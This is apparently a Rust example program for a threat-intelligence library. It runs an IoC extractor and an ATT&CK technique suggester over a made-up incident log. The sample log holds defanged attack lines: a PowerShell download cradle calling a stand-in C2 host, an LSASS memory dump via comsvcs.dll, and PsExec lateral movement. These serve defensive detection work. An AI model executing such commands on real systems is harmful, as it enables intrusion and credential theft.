//! Demonstrates the real IoC extractor and ATT&CK suggester on a realistic
//! paste. Run: cargo run -p intelscribe-core --example ingest_demo

use intelscribe_core::{extract, packs};

fn main() {
    let paste = r#"
2026-03-14 09:12:05  WKS-041  WINWORD.EXE spawned powershell.exe -nop -w hidden -enc SQBFAFgA...
  Cradle: IEX (New-Object Net.WebClient).DownloadString('hxxp://evil-c2[.]example[.]com/officeupdate')
  Beacon to 203[.]0[.]113[.]47 over port 443, and later to 10.0.0.142.
  Dropped C:\Users\amina.khan\AppData\Local\collector.exe (sha256 e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855)
  4769 RC4 (0x17) service ticket requested for svc_reporting  -> kerberoasting
  svchost.exe opened lsass.exe 0x1010 via comsvcs.dll minidump
  PsExec (PSEXESVC) over ADMIN$ to APP-02; schtasks created scheduled task 'Updater'
  Persistence: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\System
  Report emailed to attacker@bad-domain[.]net
"#;

    println!("=== Extracted IoCs ===");
    for ioc in extract::extract_iocs(paste) {
        println!("  [{:<13}] {}", ioc.ioc_type, ioc.indicator);
    }

    println!("\n=== Suggested ATT&CK techniques ===");
    for t in packs::suggest_techniques(paste) {
        println!("  {:<11} {:<42} ({})", t.id, t.name, t.tactic);
    }
}
